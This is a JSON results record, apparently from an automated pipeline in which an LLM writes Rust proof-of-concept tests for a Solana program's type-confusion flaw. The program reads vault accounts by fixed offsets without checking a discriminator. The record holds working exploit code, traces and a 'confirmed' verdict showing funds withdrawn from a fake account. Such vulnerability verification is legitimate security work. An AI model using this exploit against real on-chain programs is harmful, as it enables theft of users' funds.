@@ -1,0 +1,160 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: saldo da conta de outro tipo foi decrementado (tratada como vault); lamports foram transferidos para o recipient a partir da conta de outro tipo",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2679,
+        "completion_tokens": 1005,
+        "latency_s": 5.49
+      },
+      "raw": "{\n  \"plan\": \"O ataque COSPLAY explora a desserializacao manual do vault por offsets fixos (8..40 autoridade, 40..48 saldo) sem validar discriminador. Montamos uma conta 'vault' legitima com layout compativel (8 bytes de tag + autoridade + saldo) e um baseline de withdraw bem-sucedido. Em seguida, o ataque substitui a conta vault por uma conta de outro tipo (ex.: uma conta de configuracao) cujo layout nos offsets 8..40 e 40..48 coincide com os campos esperados, mas cujo discriminador (primeiros 8 bytes) difere do vault legitimo. O efeito medido e que o saldo da conta de outro tipo foi decrementado e lamports transferidos, provando que o programa aceitou uma conta de tipo diferente como vault.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet recipient = Pubkey::new_unique();\\n\\n// Conta vault legitima: 8 bytes de tag + autoridade (32) + saldo (8)\\nlet mut vault_data = vec![0u8; 48];\\nvault_data[0..8].copy_from_slice(&[1u8, 2, 3, 4, 5, 6, 7, 8]);\\nvault_data[8..40].copy_from_slice(authority.as_ref());\\nvault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\nlet vault = account(&env.program_id, &vault_data, Some(2_000_000));\\n\\nlet recipient_acc = wallet(0);\\n\\nlet ix = env.raw_ix(&[IX_WITHDRAW, 100_000u64.to_le_bytes().as_ref()].concat(), &[\\n    AccountMeta::new(vault.key(), false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n]);\\n\\nlet contas = vec![\\n    (vault.key(), vault.clone()),\\n    (authority, wallet(0)),\\n    (recipient, recipient_acc.clone()),\\n];\\n\\nlet r = env.baseline(\\\"withdraw legitimo do vault\\\", &ix, &contas);\\n\\n// Conta de outro tipo (ex.: config) com layout compativel nos offsets 8..40 e 40..48,\\n// mas com discriminador diferente do vault legitimo.\\nlet mut fake_data = vec![0u8; 48];\\nfake_data[0..8].copy_from_slice(&[9u8, 9, 9, 9, 9, 9, 9, 9]);\\nfake_data[8..40].copy_from_slice(authority.as_ref());\\nfake_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\nlet fake = account(&env.program_id, &fake_data, Some(2_000_000));\\n\\nlet atk_ix = env.raw_ix(&[IX_WITHDRAW, 100_000u64.to_le_bytes().as_ref()].concat(), &[\\n    AccountMeta::new(fake.key(), false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n]);\\n\\nlet atk_contas = vec![\\n    (fake.key(), fake.clone()),\\n    (authority, wallet(0)),\\n    (recipient, recipient_acc.clone()),\\n];\\n\\nlet r = env.attack(\\\"withdraw usando conta de outro tipo como vault\\\", &atk_ix, &atk_contas);\\nif r.program_result == ProgramResult::Success {\\n    let fake_after = after(&r, &fake.key());\\n    let recipient_after = after(&r, &recipient);\\n    let saldo_restante = read_u64(fake_after.data(), 40);\\n    env.effect(\\\"saldo da conta de outro tipo foi decrementado (tratada como vault)\\\", saldo_restante == 900_000);\\n    env.effect(\\\"lamports foram transferidos para o recipient a partir da conta de outro tipo\\\", recipient_after.lamports() == 100_000);\\n}\"\n}",
+      "plan": "O ataque COSPLAY explora a desserializacao manual do vault por offsets fixos (8..40 autoridade, 40..48 saldo) sem validar discriminador. Montamos uma conta 'vault' legitima com layout compativel (8 bytes de tag + autoridade + saldo) e um baseline de withdraw bem-sucedido. Em seguida, o ataque substitui a conta vault por uma conta de outro tipo (ex.: uma conta de configuracao) cujo layout nos offsets 8..40 e 40..48 coincide com os campos esperados, mas cujo discriminador (primeiros 8 bytes) difere do vault legitimo. O efeito medido e que o saldo da conta de outro tipo foi decrementado e lamports transferidos, provando que o programa aceitou uma conta de tipo diferente como vault.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet recipient = Pubkey::new_unique();\n\n// Conta vault legitima: 8 bytes de tag + autoridade (32) + saldo (8)\nlet mut vault_data = vec![0u8; 48];\nvault_data[0..8].copy_from_slice(&[1u8, 2, 3, 4, 5, 6, 7, 8]);\nvault_data[8..40].copy_from_slice(authority.as_ref());\nvault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\nlet vault = account(&env.program_id, &vault_data, Some(2_000_000));\n\nlet recipient_acc = wallet(0);\n\nlet ix = env.raw_ix(&[IX_WITHDRAW, 100_000u64.to_le_bytes().as_ref()].concat(), &[\n    AccountMeta::new(vault.key(), false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n]);\n\nlet contas = vec![\n    (vault.key(), vault.clone()),\n    (authority, wallet(0)),\n    (recipient, recipient_acc.clone()),\n];\n\nlet r = env.baseline(\"withdraw legitimo do vault\", &ix, &contas);\n\n// Conta de outro tipo (ex.: config) com layout compativel nos offsets 8..40 e 40..48,\n// mas com discriminador diferente do vault legitimo.\nlet mut fake_data = vec![0u8; 48];\nfake_data[0..8].copy_from_slice(&[9u8, 9, 9, 9, 9, 9, 9, 9]);\nfake_data[8..40].copy_from_slice(authority.as_ref());\nfake_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\nlet fake = account(&env.program_id, &fake_data, Some(2_000_000));\n\nlet atk_ix = env.raw_ix(&[IX_WITHDRAW, 100_000u64.to_le_bytes().as_ref()].concat(), &[\n    AccountMeta::new(fake.key(), false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n]);\n\nlet atk_contas = vec![\n    (fake.key(), fake.clone()),\n    (authority, wallet(0)),\n    (recipient, recipient_acc.clone()),\n];\n\nlet r = env.attack(\"withdraw usando conta de outro tipo como vault\", &atk_ix, &atk_contas);\nif r.program_result == ProgramResult::Success {\n    let fake_after = after(&r, &fake.key());\n    let recipient_after = after(&r, &recipient);\n    let saldo_restante = read_u64(fake_after.data(), 40);\n    env.effect(\"saldo da conta de outro tipo foi decrementado (tratada como vault)\", saldo_restante == 900_000);\n    env.effect(\"lamports foram transferidos para o recipient a partir da conta de outro tipo\", recipient_after.lamports() == 100_000);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `IX_WITHDRAW` in this scope\n  --> tests/attempt.rs:21:27\n   |\n21 |     let ix = env.raw_ix(&[IX_WITHDRAW, 100_000u64.to_le_bytes().as_ref...\n   |                           ^^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `IX_WITHDRAW` in this scope\n  --> tests/attempt.rs:43:31\n   |\n43 |     let atk_ix = env.raw_ix(&[IX_WITHDRAW, 100_000u64.to_le_bytes().as...\n   |                               ^^^^^^^^^^^ not found in this scope\n\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:22:32\n   |\n22 |         AccountMeta::new(vault.key(), false),\n   |                                ^^^ method not found in `AccountSharedData`\n\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:21:85\n    |\n 21 |       let ix = env.raw_ix(&[IX_WITHDRAW, 100_000u64.to_le_bytes().as_ref()].concat(), &[\n    |  __________________------_____________________________________________________________^\n    | |                  |\n    | |                  arguments to this method are incorrect\n 22 | |         AccountMeta::new(vault.key(), false),\n 23 | |         AccountMeta::new_readonly(authority, true),\n 24 | |         AccountMeta::new(recipient, false),\n 25 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 3]`\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:28:16\n   |\n28 |         (vault.key(), vault.clone()),\n   |                ^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:44:31\n   |\n44 |         AccountMeta::new(fake.key(), false),",
+        "elapsed_s": 0.8
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `IX_WITHDRAW` in this scope\n  --> tests/attempt.rs:21:27\n   |\n21 |     let ix = env.raw_ix(&[IX_WITHDRAW, 100_000u64.to_le_bytes().as_ref...\n   |                           ^^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `IX_WITHDRAW` in this scope\n  --> tests/attempt.rs:43:31\n   |\n43 |     let atk_ix = env.raw_ix(&[IX_WITHDRAW, 100_000u64.to_le_bytes().as...\n   |                               ^^^^^^^^^^^ not found in this scope\n\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:22:32\n   |\n22 |         AccountMeta::new(vault.key(), false),\n   |                                ^^^ method not found in `AccountSharedData`\n\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:21:85\n    |\n 21 |       let ix = env.raw_ix(&[IX_WITHDRAW, 100_000u64.to_le_bytes().as_ref()].concat(), &[\n    |  __________________------_____________________________________________________________^\n    | |                  |\n    | |                  arguments to this method are incorrect\n 22 | |         AccountMeta::new(vault.key(), false),\n 23 | |         AccountMeta::new_readonly(authority, true),\n 24 | |         AccountMeta::new(recipient, false),\n 25 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 3]`\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:28:16\n   |\n28 |         (vault.key(), vault.clone()),\n   |                ^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:44:31\n   |\n44 |         AccountMeta::new(fake.key(), false),"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3954,
+        "completion_tokens": 964,
+        "latency_s": 4.39
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta vault legitima com tag de 8 bytes, autoridade nos offsets 8..40 e saldo 1_000_000 nos offsets 40..48, e executo um withdraw legitimo como baseline. Depois crio uma conta de outro tipo (tag diferente) mas com o mesmo layout nos offsets 8..40 e 40..48, e a passo como vault no ataque. Se o ataque tiver sucesso, o saldo da conta falsa sera decrementado e lamports serao transferidos para o recipient, demonstrando que o programa aceitou uma conta de outro tipo como vault.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet recipient = Pubkey::new_unique();\\n\\n// Conta vault legitima: 8 bytes de tag + autoridade (32) + saldo (8)\\nlet mut vault_data = vec![0u8; 48];\\nvault_data[0..8].copy_from_slice(&[1u8, 2, 3, 4, 5, 6, 7, 8]);\\nvault_data[8..40].copy_from_slice(authority.as_ref());\\nvault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\nlet vault_key = Pubkey::new_unique();\\nlet vault = account(&env.program_id, &vault_data, Some(2_000_000));\\n\\nlet recipient_acc = wallet(0);\\n\\nlet ix_data = [&[1u8][..], &100_000u64.to_le_bytes()[..]].concat();\\nlet ix = env.raw_ix(&ix_data, vec![\\n    AccountMeta::new(vault_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n]);\\n\\nlet contas = vec![\\n    (vault_key, vault.clone()),\\n    (authority, wallet(0)),\\n    (recipient, recipient_acc.clone()),\\n];\\n\\nlet r = env.baseline(\\\"withdraw legitimo do vault\\\", &ix, &contas);\\n\\n// Conta de outro tipo (ex.: config) com layout compativel nos offsets 8..40 e 40..48,\\n// mas com discriminador diferente do vault legitimo.\\nlet mut fake_data = vec![0u8; 48];\\nfake_data[0..8].copy_from_slice(&[9u8, 9, 9, 9, 9, 9, 9, 9]);\\nfake_data[8..40].copy_from_slice(authority.as_ref());\\nfake_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\nlet fake_key = Pubkey::new_unique();\\nlet fake = account(&env.program_id, &fake_data, Some(2_000_000));\\n\\nlet atk_ix = env.raw_ix(&ix_data, vec![\\n    AccountMeta::new(fake_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n]);\\n\\nlet atk_contas = vec![\\n    (fake_key, fake.clone()),\\n    (authority, wallet(0)),\\n    (recipient, recipient_acc.clone()),\\n];\\n\\nlet r = env.attack(\\\"withdraw usando conta de outro tipo como vault\\\", &atk_ix, &atk_contas);\\nif r.program_result == ProgramResult::Success {\\n    let fake_after = after(&r, &fake_key);\\n    let recipient_after = after(&r, &recipient);\\n    let saldo_restante = read_u64(fake_after.data(), 40);\\n    env.effect(\\\"saldo da conta de outro tipo foi decrementado (tratada como vault)\\\", saldo_restante == 900_000);\\n    env.effect(\\\"lamports foram transferidos para o recipient a partir da conta de outro tipo\\\", recipient_after.lamports() == 100_000);\\n}\"\n}",
+      "plan": "Preparo uma conta vault legitima com tag de 8 bytes, autoridade nos offsets 8..40 e saldo 1_000_000 nos offsets 40..48, e executo um withdraw legitimo como baseline. Depois crio uma conta de outro tipo (tag diferente) mas com o mesmo layout nos offsets 8..40 e 40..48, e a passo como vault no ataque. Se o ataque tiver sucesso, o saldo da conta falsa sera decrementado e lamports serao transferidos para o recipient, demonstrando que o programa aceitou uma conta de outro tipo como vault.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet recipient = Pubkey::new_unique();\n\n// Conta vault legitima: 8 bytes de tag + autoridade (32) + saldo (8)\nlet mut vault_data = vec![0u8; 48];\nvault_data[0..8].copy_from_slice(&[1u8, 2, 3, 4, 5, 6, 7, 8]);\nvault_data[8..40].copy_from_slice(authority.as_ref());\nvault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\nlet vault_key = Pubkey::new_unique();\nlet vault = account(&env.program_id, &vault_data, Some(2_000_000));\n\nlet recipient_acc = wallet(0);\n\nlet ix_data = [&[1u8][..], &100_000u64.to_le_bytes()[..]].concat();\nlet ix = env.raw_ix(&ix_data, vec![\n    AccountMeta::new(vault_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n]);\n\nlet contas = vec![\n    (vault_key, vault.clone()),\n    (authority, wallet(0)),\n    (recipient, recipient_acc.clone()),\n];\n\nlet r = env.baseline(\"withdraw legitimo do vault\", &ix, &contas);\n\n// Conta de outro tipo (ex.: config) com layout compativel nos offsets 8..40 e 40..48,\n// mas com discriminador diferente do vault legitimo.\nlet mut fake_data = vec![0u8; 48];\nfake_data[0..8].copy_from_slice(&[9u8, 9, 9, 9, 9, 9, 9, 9]);\nfake_data[8..40].copy_from_slice(authority.as_ref());\nfake_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\nlet fake_key = Pubkey::new_unique();\nlet fake = account(&env.program_id, &fake_data, Some(2_000_000));\n\nlet atk_ix = env.raw_ix(&ix_data, vec![\n    AccountMeta::new(fake_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n]);\n\nlet atk_contas = vec![\n    (fake_key, fake.clone()),\n    (authority, wallet(0)),\n    (recipient, recipient_acc.clone()),\n];\n\nlet r = env.attack(\"withdraw usando conta de outro tipo como vault\", &atk_ix, &atk_contas);\nif r.program_result == ProgramResult::Success {\n    let fake_after = after(&r, &fake_key);\n    let recipient_after = after(&r, &recipient);\n    let saldo_restante = read_u64(fake_after.data(), 40);\n    env.effect(\"saldo da conta de outro tipo foi decrementado (tratada como vault)\", saldo_restante == 900_000);\n    env.effect(\"lamports foram transferidos para o recipient a partir da conta de outro tipo\", recipient_after.lamports() == 100_000);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "withdraw legitimo do vault",
+            "result": "Success",
+            "compute_units": 391,
+            "account_flags": "-w,sr,-w",
+            "ix_head": "01a0860100000000",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "0102030405060708",
+                "digest": "8f88c195b6489947",
+                "post": "01020304050607080000000000000002000000000000000000000000000000000000000000000000a0bb0d0000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "withdraw usando conta de outro tipo como vault",
+            "result": "Success",
+            "compute_units": 391,
+            "account_flags": "-w,sr,-w",
+            "ix_head": "01a0860100000000",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "0909090909090909",
+                "digest": "8745c3f54ad8ffd9",
+                "post": "09090909090909090000000000000002000000000000000000000000000000000000000000000000a0bb0d0000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "saldo da conta de outro tipo foi decrementado (tratada como vault)",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "lamports foram transferidos para o recipient a partir da conta de outro tipo",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 391 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 391 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: saldo da conta de outro tipo foi decrementado (tratada como vault); lamports foram transferidos para o recipient a partir da conta de outro tipo"
+    }
+  ],
+  "case_id": "SSP-01-P-S",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "medium",
+    "evidence": "let vault_data = vault.try_borrow_data()?;\nlet stored_authority = read_pubkey(&vault_data[8..40]);\nlet balance = u64::from_le_bytes(vault_data[40..48].try_into()...);",
+    "explanation": "Os dados da conta `vault` sao desserializados manualmente por offsets fixos (8..40 para autoridade, 40..48 para saldo) sem validar nenhum discriminador/tag de tipo no inicio do buffer. Uma conta de outro tipo com layout compativel poderia ser passada como vault e interpretada incorretamente.",
+    "attack_hypothesis": "O atacante fornece uma conta de um tipo diferente (por exemplo, uma conta de configuracao ou de outro usuario) cujo layout de bytes nos offsets 8..40 e 40..48 coincida com os campos esperados, fazendo o programa tratar dados de outro tipo como um vault valido."
+  }
+}
